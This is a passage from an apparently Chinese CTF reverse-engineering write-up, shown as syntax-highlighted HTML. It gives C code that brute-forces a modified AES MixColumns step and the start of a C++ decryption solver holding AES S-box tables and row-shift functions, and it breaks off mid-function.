class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> __cdecl <span class="title function_">mul2</span><span class="params">(<span class="type">uint8_t</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (a &amp; <span class="number">0x80</span>u) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * a;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">2</span> * a) ^ <span class="number">0x1B</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tmp是输入值，ciphertext是输出值，这里已知ciphertext，想求tmp，想了一下相互的关系，发现ciphertext相互异或就是t，所以我尝试爆破tmp的值，由于每个tmp是8位，每两个进行一次检查，所以相当于是爆16位，位数比较小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cToTmp</span><span class="params">(<span class="type">uint8_t</span>* tmp, <span class="type">uint8_t</span>* c)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xF</span>u; i += <span class="number">4</span>) &#123;</span><br><span class="line"><span class="type">uint8_t</span> t = c[i + <span class="number">2</span>] ^ c[i + <span class="number">1</span>] ^ c[i] ^ c[i + <span class="number">3</span>];</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t0 = <span class="number">0</span>; t0 &lt;= <span class="number">256</span>; t0++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t1 = <span class="number">0</span>; t1 &lt;= <span class="number">256</span>; t1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i] == (t ^ t0 ^ mul2(t0 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t2 = <span class="number">0</span>; t2 &lt;= <span class="number">256</span>; t2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">1</span>] == (t ^ t1 ^ mul2(t2 ^ t1)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint16_t</span> t3 = <span class="number">0</span>; t3 &lt;= <span class="number">256</span>; t3++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">2</span>] == (t ^ t2 ^ mul2(t2 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i + <span class="number">3</span>] == (t ^ t3 ^ mul2(t0 ^ t3)))</span><br><span class="line">&#123;</span><br><span class="line">tmp[i] = t0;</span><br><span class="line">tmp[i + <span class="number">1</span>] = t1;</span><br><span class="line">tmp[i + <span class="number">2</span>] = t2;</span><br><span class="line">tmp[i + <span class="number">3</span>] = t3;</span><br><span class="line"><span class="comment">//printf(&quot;%x %x %x %x\n&quot;, tmp[i], tmp[i + 1], tmp[i + 2], tmp[i + 3]);</span></span><br><span class="line"><span class="keyword">goto</span> next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">next:;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个测试下来确实可以得到一开始的答案，所以最后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line"><span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line"><span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line"><span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line"><span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> INV_SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>,</span><br><span class="line"><span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0xCB</span>,</span><br><span class="line"><span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>, <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>,</span><br><span class="line"><span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line"><span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line"><span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>,</span><br><span class="line"><span class="number">0x3A</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line"><span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>,</span><br><span class="line"><span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>, <span class="number">0x5A</span>, <span class="number">0xF4</span>,</span><br><span class="line"><span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>, <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>, <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>,</span><br><span class="line"><span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">shift_rows</span><span class="params">(<span class="type">uint8_t</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempa; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempb; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempc; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">temp = state[<span class="number">12</span>];</span><br><span class="line">state[<span class="number">12</span>] = state[<span class="number">8</span>];</span><br><span class="line">state[<span class="number">8</span>] = state[<span class="number">4</span>];</span><br><span class="line">state[<span class="number">4</span>] = *state;</span><br><span class="line">*state = temp;</span><br><span class="line">tempa = state[<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>] = state[<span class="number">9</span>];</span><br><span class="line">state[<span class="number">9</span>] = tempa;</span><br><span class="line">tempb = state[<span class="number">5</span>];</span><br><span class="line">state[<span class="number">5</span>] = state[<span class="number">13</span>];</span><br><span class="line">state[<span class="number">13</span>] = tempb;</span><br><span class="line">tempc = state[<span class="number">2</span>];</span><br><span class="line">state[<span class="number">2</span>] = state[<span class="number">6</span>];</span><br><span class="line">state[<span class="number">6</span>] = state[<span class="number">10</span>];</span><br><span class="line">state[<span class="number">10</span>] = state[<span class="number">14</span>];</span><br><span class="line">state[<span class="number">14</span>] = tempc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">inv_shiftrows</span><span class="params">( <span class="type">uint8_t</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint8_t</span> temp; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempa; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempb; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"><span class="type">uint8_t</span> tempc; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//temp = state[12];</span></span><br><span class="line"><span class="comment">//state[12] = state[8];</span></span><br><span class="line"><span class="comment">//state[8] = state[4];</span></span><br><span class="line"><span class="comment">//state[4] = *state;</span></span><br><span class="line"><span class="comment">//*state = temp;</span></span><br><span class="line"></span><br><span class="line">temp = *state;</span><br><span class="line">*state = state[<span class="number">4</span>];</span><br><span class="line">state[<span class="number">4</span>] = state[<span class="number">8</span>];</span><br><span class="line">state[<span class="number">8</span>] = state[<span class="number">12</span>];</span><br><span class="line">state[<span class="number">12</span>] = temp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//tempa = state[1];</span></span><br><span class="line"><span class="comment">//state[1] = state[9];</span></span><br><span class="line"><span class="comment">//state[9] = tempa;</span></span><br><span class="line"></span><br><span class="line">tempa = state[<span class="number">9</span>];</span><br><span class="line">state[<span class="number">9</span>] = state[<span class="number">1</span>];</span><br><span class="line">state[<span class="number">1</span>] = tempa;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//tempb = state[5];</span></span><br><span 